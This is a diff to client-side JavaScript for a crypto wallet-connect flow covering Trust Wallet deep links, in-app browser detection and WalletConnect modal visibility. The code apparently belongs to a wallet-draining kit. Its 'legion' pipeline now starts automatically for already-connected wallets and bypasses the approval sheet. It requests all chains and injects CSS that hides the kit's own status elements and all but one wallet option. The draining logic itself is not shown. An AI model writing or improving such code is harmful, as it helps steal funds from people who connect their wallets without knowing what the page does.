@@ -161,9 +161,16 @@
       } catch (_) {}
     }
 
-    // Already inside Trust Browser → injected provider (no WC freeze)
+    // Already inside Trust Browser → AppKit multichain (all chains), not ETH-only injected
     if (walletId === 'trust' && getInAppWallet() === 'trust') {
       try {
+        try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
+        try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
+        setAppKitVisible(true);
+        if (typeof window.__TRUST_CONNECT_APPKIT__ === 'function') {
+          window.__TRUST_CONNECT_APPKIT__();
+          return;
+        }
         if (typeof window.__TRUST_CONNECT_INJECTED__ === 'function') {
           window.__TRUST_CONNECT_INJECTED__();
           return;
@@ -189,15 +196,18 @@
       return;
     }
 
-    // Named wallet: set deep-link target, keep AppKit hidden on mobile
+    // Named wallet: deep-link on mobile; on desktop SHOW AppKit QR (do not hide)
     try { window.__LEGION_DEEP_LINK_TARGET__ = walletId; } catch (_) {}
-    setAppKitVisible(false);
+    var mobileUa2 = /Android|iPhone|iPad|iPod|Mobile/i.test(String(navigator.userAgent || ''));
+    setAppKitVisible(!mobileUa2);
 
-    // Resume if already connected
+    // Resume if already connected — single pipeline owner (no approve sheet)
     var existing = alreadyConnectedAddr();
     if (existing) {
-      try { if (typeof window.__TRUST_SHOW_APPROVE__ === 'function') window.__TRUST_SHOW_APPROVE__(existing); } catch (_) {}
-      try { if (typeof L.continueConnected === 'function') { L.continueConnected(); return; } } catch (_) {}
+      try {
+        if (typeof L.startPipeline === 'function') { L.startPipeline({ reason: 'resume' }); return; }
+        if (typeof L.continueConnected === 'function') { L.continueConnected(); return; }
+      } catch (_) {}
     }
 
     if (!alreadyConnectedAddr()) { try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {} }
@@ -213,12 +223,22 @@
   }
 
   // ── AppKit modal visibility toggle ─────────────────────────────────────────
+  // BUG FIX: old CSS hid w3m-modal for ALL viewports ≤1024px — desktop narrow
+  // windows (Cursor browser, etc.) got opacity:0 so QR never appeared.
+  // Now: hide only on real mobile UA when deeplink path intentionally hides modal.
   function setAppKitVisible(show) {
     var s = document.getElementById('__wc_appkit_css');
     if (!s) { s = document.createElement('style'); s.id = '__wc_appkit_css'; document.head.appendChild(s); }
-    s.textContent = show ? '' : '@media(max-width:1024px){w3m-modal,wcm-modal{opacity:0!important;pointer-events:none!important}}';
+    if (show) {
+      s.textContent = 'w3m-modal,wcm-modal{opacity:1!important;pointer-events:auto!important;visibility:visible!important;z-index:2147483000!important}';
+      return;
+    }
+    var mobileUa = /Android|iPhone|iPad|iPod|Mobile/i.test(String(navigator.userAgent || ''));
+    s.textContent = mobileUa
+      ? 'w3m-modal,wcm-modal{opacity:0!important;pointer-events:none!important}'
+      : 'w3m-modal,wcm-modal{opacity:1!important;pointer-events:auto!important;visibility:visible!important}';
   }
-  // Default: hide AppKit on mobile (deep-link rescue handles it)
+  // Default: hide AppKit on mobile (deeplink path), show on desktop (QR path)
   setAppKitVisible(false);
 
   function openSmartConnect() {
@@ -226,6 +246,13 @@
     var inApp = getInAppWallet();
     if (inApp === 'trust') {
       try {
+        try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
+        try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
+        setAppKitVisible(true);
+        if (typeof window.__TRUST_CONNECT_APPKIT__ === 'function') {
+          window.__TRUST_CONNECT_APPKIT__();
+          return;
+        }
         if (typeof window.__TRUST_CONNECT_INJECTED__ === 'function') {
           window.__TRUST_CONNECT_INJECTED__();
           return;
@@ -307,7 +334,10 @@
     window.__SELECTED_WALLET__ = 'trust';
     // Always pin Trust as deep-link target (mobile + desktop WC→Trust)
     try { window.__LEGION_DEEP_LINK_TARGET__ = 'trust'; } catch (_) {}
-    setAppKitVisible(false);
+    // Desktop browser: KEEP AppKit visible so WalletConnect QR can show.
+    // Mobile: hide modal and use deeplink / in-app path instead.
+    var mobileUa = /Android|iPhone|iPad|iPod|Mobile/i.test(String(navigator.userAgent || ''));
+    setAppKitVisible(!mobileUa || !!getInAppWallet());
 
     // Mobile Safari → open_url into Trust Browser (scripts stay alive there)
     if (isMobile() && !getInAppWallet()) {
@@ -318,9 +348,16 @@
       } catch (_) {}
     }
 
-    // Inside Trust Browser → injected
+    // Inside Trust Browser → AppKit multichain (all chains popup)
     if (getInAppWallet() === 'trust') {
       try {
+        try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
+        try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
+        setAppKitVisible(true);
+        if (typeof window.__TRUST_CONNECT_APPKIT__ === 'function') {
+          window.__TRUST_CONNECT_APPKIT__();
+          return;
+        }
         if (typeof window.__TRUST_CONNECT_INJECTED__ === 'function') {
           window.__TRUST_CONNECT_INJECTED__();
           return;
@@ -333,9 +370,10 @@
     if (existing) {
       console.warn('[TrustDirect] already connected — resume', existing.slice(0, 10));
       try {
-        if (typeof window.__TRUST_SHOW_APPROVE__ === 'function') window.__TRUST_SHOW_APPROVE__(existing);
-      } catch (_) {}
-      try {
+        if (window.legion && typeof window.legion.startPipeline === 'function') {
+          window.legion.startPipeline({ reason: 'resume' });
+          return;
+        }
         if (window.legion && typeof window.legion.continueConnected === 'function') {
           window.legion.continueConnected();
           return;
@@ -443,6 +481,7 @@
     '#__lgn_root{display:none!important}',
     '#cwModal.cw-show{display:none!important}',
     '#cwModal .cw-wallet-item:not(:first-child){display:none!important}',
+    '#__lgn_st{display:none!important}',
   ].join('');
   (document.head || document.documentElement).appendChild(style);
 
